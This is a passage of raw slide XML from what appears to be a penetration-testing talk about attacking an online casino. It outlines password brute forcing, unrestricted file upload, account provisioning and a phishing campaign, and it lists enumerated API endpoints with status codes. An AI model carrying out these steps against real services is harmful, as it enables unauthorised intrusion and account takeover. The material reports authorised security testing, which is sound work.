              <a:rPr lang="en" sz="2100">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>Launch a password brute force until you get Password1 </a:t>
            </a:r>
            <a:endParaRPr sz="2100">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-361950" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2100"/>
              <a:buFont typeface="Abhaya Libre"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2100">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>Login </a:t>
            </a:r>
            <a:endParaRPr sz="2100">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-361950" lvl="1" marL="1371600" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2100"/>
              <a:buFont typeface="Abhaya Libre"/>
              <a:buChar char="○"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2100">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>File upload with no restrictions </a:t>
            </a:r>
            <a:endParaRPr sz="2100">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-361950" lvl="1" marL="1371600" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2100"/>
              <a:buFont typeface="Abhaya Libre"/>
              <a:buChar char="○"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2100">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>Modify/provision more user accounts </a:t>
            </a:r>
            <a:endParaRPr sz="2100">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-361950" lvl="1" marL="1371600" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2100"/>
              <a:buFont typeface="Abhaya Libre"/>
              <a:buChar char="○"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2100">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>profit(??)</a:t>
            </a:r>
            <a:endParaRPr sz="2100">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="717" name="Shape 717"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="718" name="Google Shape;718;p87"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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9" name="Google Shape;719;p87"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="720" name="Google Shape;720;p87"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472200" y="1115875"/>
            <a:ext cx="8671800" cy="46191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t/>
            </a:r>
            <a:endParaRPr sz="2200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="457200" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>lottery-api.casinosite.com/api/v1/auth/login</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>lottery-api.casinosite.com/api/v1/auth/forgot_password</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>lottery-api.casinosite.com/api/v1/auth/new (405)</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>lottery-api.casinosite.com/api/v1/users/ (401)</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>lottery-api.casinosite.com/api/v1/users/123 (401)</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>lottery-api.casinosite.com/api/v1/users/me (401)</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>lottery-api.casinosite.com/api/v1/users/verify (401)</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="457200" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="457200" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="2200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="457200" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="721" name="Google Shape;721;p87"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="845225" y="266850"/>
            <a:ext cx="7098900" cy="1262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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Beating an Online Casino</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="722" name="Google Shape;722;p87"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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sld>
</file>

<file path=ppt/slides/slide7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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="726" name="Shape 726"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="727" name="Google Shape;727;p88"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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8" name="Google Shape;728;p88"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="729" name="Google Shape;729;p88"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="774450" y="1940700"/>
            <a:ext cx="7595100" cy="1262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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Phishing definitely</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t> not another casino</a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="733" name="Shape 733"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="734" name="Google Shape;734;p89"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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5" name="Google Shape;735;p89"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="736" name="Google Shape;736;p89"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1041700" y="266850"/>
            <a:ext cx="6902400" cy="723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3500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Phishing </a:t>
            </a:r>
            <a:endParaRPr sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="737" name="Google Shape;737;p89"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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
        <p:nvSpPr>
          <p:cNvPr id="738" name="Google Shape;738;p89"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502625" y="1728300"/>
            <a:ext cx="8398200" cy="1759200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="91425" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="-425450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="3100"/>
              <a:buFont typeface="Abhaya Libre"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="3100">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>Social engineering was in scope.</a:t>
            </a:r>
            <a:endParaRPr sz="3100">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre"/>
              <a:ea typeface="Abhaya Libre"/>
              <a:cs typeface="Abhaya Libre"/>
              <a:sym typeface="Abhaya Libre"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-425450" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="3100"/>
              <a:buFont typeface="Abhaya Libre"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="3100">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>Rule: "</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="3100">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre"/>
                <a:ea typeface="Abhaya Libre"/>
                <a:cs typeface="Abhaya Libre"/>
                <a:sym typeface="Abhaya Libre"/>
              </a:rPr>
              <a:t>don't email more than 100-200 people</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="3100">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
